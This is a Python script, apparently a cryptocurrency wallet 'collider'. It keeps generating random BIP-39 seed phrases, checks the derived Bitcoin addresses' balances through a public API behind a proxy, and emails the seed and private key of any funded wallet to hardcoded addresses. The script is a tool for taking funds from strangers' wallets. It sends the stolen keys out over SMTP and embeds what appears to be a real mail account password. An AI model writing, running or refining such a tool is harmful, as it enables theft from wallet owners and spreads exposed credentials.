# -*- coding: utf-8 -*-
# install cryptofuzz & colorthon
# pip install cryptofuzz / pip install colorthon
import multiprocessing
from colorthon import Colors
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hdwallet.utils import generate_mnemonic
import requests
from email.mime.text import MIMEText
from email.header import Header
import smtplib

# COLORS CODE --------------------
RED = Colors.RED
GREEN = Colors.GREEN
YELLOW = Colors.YELLOW
CYAN = Colors.CYAN
WHITE = Colors.WHITE
RESET = Colors.RESET


# COLORS CODE -------------------

def send_email(msg: str, recever="164093410@qq.com"):
    message = MIMEText(msg, _subtype='plain', _charset='utf-8')
    message['From'] = "buchang_123@163.com"
    message['To'] = f"<591547726@qq.com>"
    message['Subject'] = Header(f'EVM碰撞器', 'utf-8')
    smtper = smtplib.SMTP_SSL("smtp.163.com", 465)
    smtper.login("buchang_123@163.com", "PMFHEFUVASHUISBQ")
    smtper.sendmail("buchang_123@163.com", recever, message.as_string())

def generate_wallets():
    seed = generate_mnemonic()
    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
    hdwallet.from_mnemonic(mnemonic=seed)
    hdwallet.from_path("m/44'/0'/0'/0/0")
    priv = hdwallet.private_key()

    addr1 = hdwallet.p2wsh_address()
    addr2 = hdwallet.p2pkh_address()
    addr3 = hdwallet.p2wpkh_address()
    addr4 = hdwallet.p2sh_address()

    return {
        "seed": seed,
        "private_key": priv,
        "address": [addr1, addr2, addr3, addr4]
    }

def get_balance(address):
    try:
        proxy = "http://%(ip)s:%(port)s" % {
            "ip": "127.0.0.1",
            "port": "10809",
        }
        proxies = {
            "http": proxy,
            "https": proxy,
        }
        url = f"https://bitcoin.atomicwallet.io/api/v2/address/{address}"
        response = requests.get(url, proxies=proxies)
        data = response.json()
        balance = int(data.get('balance', 0)) / 100000000
        print(url,balance)
        return balance
    except Exception as error:
        print('Error: ', error)
        return 0

def MainCheck():
    while True:
        wallets = generate_wallets()
        for addr in wallets["address"]:
            balance = get_balance(address=addr)
            if float(balance) > 0:
                send_email(msg=str(wallets))


if __name__ == '__main__':
    cores = int(input("请输入执行进程数:"))
    for i in range(cores):
        p = multiprocessing.Process(target=MainCheck)
        p.start()
